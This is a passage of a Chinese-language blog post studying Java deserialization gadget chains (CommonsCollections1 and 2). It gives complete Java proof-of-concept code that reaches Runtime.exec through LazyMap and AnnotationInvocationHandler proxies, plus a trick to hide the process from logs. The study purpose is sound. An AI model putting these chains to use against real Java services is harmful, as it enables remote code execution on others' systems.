ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map decorate = TransformedMap.decorate(hm, null, chainedTransformer);</span><br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//生成InvocationHandler类型的类实例</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//生成代理类实例，代理invocationHandler实例</span><br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class,proxymap);<span class="hljs-comment">//再次实例化一个AnnotationInvocationHandler，并且将proxymap传入给memberValues</span><br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br><span class="hljs-comment">//        oos.writeObject(newInstance);</span><br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此利用链为</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-comment">//感觉作者在炫技，太巧了，QAQ</span><br><span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><blockquote><p>p 牛提到，调试过程中出现还没有到<code>readObject</code>就弹出了计算器，原因是：在使用 Proxy 代理了 map 对象后，在任何地方执行 map 的方法就会触发 Payload 弹出计算器，所以，在本地调试代码的时候，因为调试器会调用一些 toString 之类的方法，导致不经意间触发了命令</p><p>另一个就是在执行完可见控制台出现了 ProcessImpl 异常，为了防止日志记录，我们可以在 ChainedTransformer 增加一个 ConstantTransformer(1)，从而掩盖了进程的日志特征</p></blockquote><ul><li>第一个问题，ysoserial 处理的方式为</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//        Transformer[] actualeviltransformer = &#123;</span><br><span class="hljs-comment">//                new ConstantTransformer(Runtime.class),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="hljs-comment">//                new ConstantTransformer(1)</span><br><span class="hljs-comment">//        &#125;;</span><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        <span class="hljs-comment">//fake u</span><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//生成InvocationHandler类型的类实例</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<span class="hljs-comment">//生成代理类实例，代理invocationHandler实例</span><br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, proxymap);<span class="hljs-comment">//再次实例化一个AnnotationInvocationHandler，并且将proxymap传入给memberValues</span><br><br>        <span class="hljs-comment">//arm with actual evil transformer chain</span><br>        Field iTransformersF = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//        iTransformersF.set(fakechainedTransformer,actualeviltransformer);</span><br>        iTransformersF.set(fakechainedTransformer,chainedTransformer);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里也有个小细节，为什么假<code>Transformer</code>数组需要串起来，而反而元素更多的 evil<code>Transformer</code>数组没有串起来</p><blockquote><p>调整 actualeviltransformer 或 chainedTransformer 的注释，以及反射修改 iTransformersF 变量的注释，可以发现串起来的没有弹出计算器</p></blockquote><p>因为使用<code>LazyMap.decorate</code>装饰，没有第二个参数为<code>Transformer[]</code>的重载方法，因此必须串起来，而<code>ChainedTransformer</code>有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br></code></pre></td></tr></table></figure><p>而通过反射修改到的<code>ChainedTransformer</code>属性<code>iTransformers</code>却是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer[] iTransformers;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829141357207.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829142036388.png"></p><blockquote><p>后记：这条链分析在入门的时候难度确实挺大的，但是发现不会的就反复看源码和上下文，找资料写 demo，调试分析，还是一步步地学习分析了一遍，尤其是编写一块对如何构造有了初步的理解；后面是 AnnotationInvocationHandler.invoke()-&gt;LazyMap.get()，为了能触发 invoke，使用了动态代理的方式，那能不能使用反射调用 AnnotationInvocationHandler.invoke()呢？</p><p>其实这个想法很蠢，说到底还是学习庞杂的内容造成的幻觉，当然能够调用这个 invoke 方法，但是这个 invoke 方法需要传入的都是代理对象，代理对象内的方法</p><p>具体的细节更应该关注的是，调用了代理对象如何触发了 invoke 方法，以及传入的参数是从哪里获得的</p><p>LazyMap 在 CommonsCollections4.0 没有 LazyMap.decorate 方法，而是改了一个名 LazyMap.lazymap</p><p>因此 CC1、CC3 都可以用 CommonsCollections4 的 jar 包，在 LazyMap 时换一下方法名而已</p></blockquote><h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><h3 id="Pre-1"><a href="#Pre-1" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 4.0</p><p>javassit</p></blockquote><h4 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-1"><a href="#关键类-1" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">PriorityQueue</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">TransformingComparator</span><br></code></pre></td></tr></table></figure><p>maven 添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>首先来学习一些铺垫的前置知识，源代码、字节码、机器码这些概念就不再赘述了</p><p>字节码文件是有固定的结构的，<a href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html">JVM 规范</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs class">ClassFile &#123;<br>    u4             magic;//cafe babe是魔数即class文件标识符,JVM加载class文件时会先读取这4个字节<br>    u2             minor_version;//副版本号<br>    u2             major_version;//主版本号 0034是jdk1.8<br>    u2             constant_pool_count;//常量池计数器<br>    cp_info        constant_pool[constant_pool_count-1];//常量池<br>    u2             access_flags;//访问标识<br>    u2             this_class;//当前类<br>    u2             super_class;//父类<br>    u2             interfaces_count;//类继承或实现接口数<br>    u2             interfaces[interfaces_count];//接口数组<br>    u2             fields_count;//类成员变量数<br>    field_info     fields[fields_count];//类成员变量数组<br>    u2             methods_count;//类成员方法数<br>    method_info    methods[methods_count];//类成员方法数组<br>    u2             attributes_count;//类属性数<br>    attribute_info attributes[attributes_count];//属性数组<br>&#125;<br></code></pre></td></tr></table></figure><p>在 JVM 规范中<code>u1</code>、<code>u2</code>、<code>u4</code>分别表示的是 1、2、4 个字节的无符号数，可使用<code>java.io.DataInputStream</code>类中的对应方法：<code>readUnsignedByte</code>、<code>readUnsignedShort</code>、<code>readInt</code>方法读取。除此之外，表结构(<code>table</code>)由任意数量的可变长度的项组成，用于表示 class 中的复杂结构，如上述的：<code>cp_info</code>、<code>field_info</code>、<code>method_info</code>、<code>attribute_info</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000000</span>: cafe babe <span class="hljs-number">0000</span> <span class="hljs-number">0034</span> <span class="hljs-number">001</span>d <span class="hljs-number">0</span>a<span class="hljs-number">00</span> <span class="hljs-number">0600</span> <span class="hljs-number">0</span>f<span class="hljs-number">09</span>  .......<span class="hljs-number">4</span>........<br><span class="hljs-attribute">00000010</span>: <span class="hljs-number">0010</span> <span class="hljs-number">0011</span> <span class="hljs-number">0800</span> <span class="hljs-number">120</span>a <span class="hljs-number">0013</span> <span class="hljs-number">0014</span> <span class="hljs-number">0700</span> <span class="hljs-number">1507</span>  ................<br><span class="hljs-attribute">00000020</span>: <span class="hljs-number">0016</span> <span class="hljs-number">0100</span> <span class="hljs-number">063</span>c <span class="hljs-number">696</span>e <span class="hljs-number">6974</span> <span class="hljs-number">3</span>e<span class="hljs-number">01</span> <span class="hljs-number">0003</span> <span class="hljs-number">2829</span>  .....&lt;init&gt;...()<br><span class="hljs-attribute">00000030</span>: <span class="hljs-number">5601</span> <span class="hljs-number">0004</span> <span class="hljs-number">436</span>f <span class="hljs-number">6465</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>f<span class="hljs-number">4</span>c <span class="hljs-number">696</span>e <span class="hljs-number">654</span>e  V...Code...LineN<br><span class="hljs-attribute">00000040</span>: <span class="hljs-number">756</span>d <span class="hljs-number">6265</span> <span class="hljs-number">7254</span> <span class="hljs-number">6162</span> <span class="hljs-number">6</span>c<span class="hljs-number">65</span> <span class="hljs-number">0100</span> <span class="hljs-number">046</span>d <span class="hljs-number">6169</span>  umberTable...mai<br><span class="hljs-attribute">00000050</span>: <span class="hljs-number">6</span>e<span class="hljs-number">01</span> <span class="hljs-number">0016</span> <span class="hljs-number">285</span>b <span class="hljs-number">4</span>c<span class="hljs-number">6</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span>  n...([Ljava/lang<br><span class="hljs-attribute">00000060</span>: <span class="hljs-number">2</span>f<span class="hljs-number">53</span> <span class="hljs-number">7472</span> <span class="hljs-number">696</span>e <span class="hljs-number">673</span>b <span class="hljs-number">2956</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>a<span class="hljs-number">53</span> <span class="hljs-number">6</span>f<span class="hljs-number">75</span>  /String;)V...Sou<br><span class="hljs-attribute">00000070</span>: <span class="hljs-number">7263</span> <span class="hljs-number">6546</span> <span class="hljs-number">696</span>c <span class="hljs-number">6501</span> <span class="hljs-number">0008</span> <span class="hljs-number">4343</span> <span class="hljs-number">322</span>e <span class="hljs-number">6</span>a<span class="hljs-number">61</span>  rceFile...CC<span class="hljs-number">2</span>.ja<br><span class="hljs-attribute">00000080</span>: <span class="hljs-number">7661</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0700</span> <span class="hljs-number">0807</span> <span class="hljs-number">0017</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">1800</span> <span class="hljs-number">1901</span>  va..............<br><span class="hljs-attribute">00000090</span>: <span class="hljs-number">000</span>b <span class="hljs-number">4865</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>c <span class="hljs-number">6</span>f<span class="hljs-number">20</span> <span class="hljs-number">576</span>f <span class="hljs-number">726</span>c <span class="hljs-number">6407</span> <span class="hljs-number">001</span>a  ..Hello World...<br><span class="hljs-attribute">000000a0</span>: <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">1</span>b<span class="hljs-number">00</span> <span class="hljs-number">1</span>c<span class="hljs-number">01</span> <span class="hljs-number">001</span>a <span class="hljs-number">436</span>f <span class="hljs-number">6</span>d<span class="hljs-number">6</span>d <span class="hljs-number">6</span>f<span class="hljs-number">6</span>e <span class="hljs-number">7343</span>  ........CommonsC<br><span class="hljs-attribute">000000b0</span>: <span class="hljs-number">6</span>f<span class="hljs-number">6</span>c <span class="hljs-number">6</span>c<span class="hljs-number">65</span> <span class="hljs-number">6374</span> <span class="hljs-number">696</span>f <span class="hljs-number">6</span>e<span class="hljs-number">73</span> <span class="hljs-number">2</span>f<span class="hljs-number">43</span> <span class="hljs-number">4332</span> <span class="hljs-number">2</span>f<span class="hljs-number">43</span>  ollections/CC<span class="hljs-number">2</span>/C<br><span class="hljs-attribute">000000c0</span>: <span class="hljs-number">4332</span> <span class="hljs-number">0100</span> <span class="hljs-number">106</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span> <span class="hljs-number">2</span>f<span class="hljs-number">4</span>f  C<span class="hljs-number">2</span>...java/lang/O<br><span class="hljs-attribute">000000d0</span>: <span class="hljs-number">626</span>a <span class="hljs-number">6563</span> <span class="hljs-number">7401</span> <span class="hljs-number">0010</span> <span class="hljs-number">6</span>a<span class="hljs-number">61</span> <span class="hljs-number">7661</span> <span class="hljs-number">2</span>f<span class="hljs-number">6</span>c <span class="hljs-number">616</span>e  bject...java/lan<br><span class="hljs-attribute">000000e0</span>: <span class="hljs-number">672</span>f <span class="hljs-number">5379</span> <span class="hljs-number">7374</span> <span class="hljs-number">656</span>d <span class="hljs-number">0100</span> <span class="hljs-number">036</span>f <span class="hljs-number">7574</span> <span class="hljs-number">0100</span>  g/System...out..<br><span class="hljs-attribute">000000f0</span>: <span class="hljs-number">154</span>c <span class="hljs-number">6</span>a<span class="hljs-number">61</span> <span class="hljs-number">7661</span> <span class="hljs-number">2</span>f<span class="hljs-number">69</span> <span class="hljs-number">6</span>f<span class="hljs-number">2</span>f <span class="hljs-number">5072</span> <span class="hljs-number">696</span>e <span class="hljs-number">7453</span>  .Ljava/io/PrintS<br><span class="hljs-attribute">00000100</span>: <span class="hljs-number">7472</span> <span class="hljs-number">6561</span> <span class="hljs-number">6</span>d<span class="hljs-number">3</span>b <span class="hljs-number">0100</span> <span class="hljs-number">136</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f <span class="hljs-number">696</span>f  tream;...java/io<br><span class="hljs-attribute">00000110</span>: <span class="hljs-number">2</span>f<span class="hljs-number">50</span> <span class="hljs-number">7269</span> <span class="hljs-number">6</span>e<span class="hljs-number">74</span> <span class="hljs-number">5374</span> <span class="hljs-number">7265</span> <span class="hljs-number">616</span>d <span class="hljs-number">0100</span> <span class="hljs-number">0770</span>  /PrintStream...p<br><span class="hljs-attribute">00000120</span>: <span class="hljs-number">7269</span> <span class="hljs-number">6</span>e<span class="hljs-number">74</span> <span class="hljs-number">6</span>c<span class="hljs-number">6</span>e <span class="hljs-number">0100</span> <span class="hljs-number">1528</span> <span class="hljs-number">4</span>c<span class="hljs-number">6</span>a <span class="hljs-number">6176</span> <span class="hljs-number">612</span>f  rintln...(Ljava/<br><span class="hljs-attribute">00000130</span>: <span class="hljs-number">6</span>c<span class="hljs-number">61</span> <span class="hljs-number">6</span>e<span class="hljs-number">67</span> <span class="hljs-number">2</span>f<span class="hljs-number">53</span> <span class="hljs-number">7472</span> <span class="hljs-number">696</span>e <span class="hljs-number">673</span>b <span class="hljs-number">2956</span> <span class="hljs-number">0021</span>  lang/String;)V.!<br><span class="hljs-attribute">00000140</span>: <span class="hljs-number">0005</span> <span class="hljs-number">0006</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0002</span> <span class="hljs-number">0001</span> <span class="hljs-number">0007</span> <span class="hljs-number">0008</span>  ................<br><span class="hljs-attribute">00000150</span>: <span class="hljs-number">0001</span> <span class="hljs-number">0009</span> <span class="hljs-number">0000</span> <span class="hljs-number">001</span>d <span class="hljs-number">0001</span> <span class="hljs-number">0001</span> <span class="hljs-number">0000</span> <span class="hljs-number">0005</span>  ................<br><span class="hljs-attribute">00000160</span>: <span class="hljs-number">2</span>ab<span class="hljs-number">7</span> <span class="hljs-number">0001</span> b<span class="hljs-number">100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0100</span> <span class="hljs-number">0</span>a<span class="hljs-number">00</span> <span class="hljs-number">0000</span> <span class="hljs-number">0600</span>  *...............<br><span class="hljs-attribute">00000170</span>: <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0300</span> <span class="hljs-number">0900</span> <span class="hljs-number">0</span>b<span class="hljs-number">00</span> <span class="hljs-number">0</span>c<span class="hljs-number">00</span> <span class="hljs-number">0100</span> <span class="hljs-number">0900</span>  ................<br><span class="hljs-attribute">00000180</span>: <span class="hljs-number">0000</span> <span 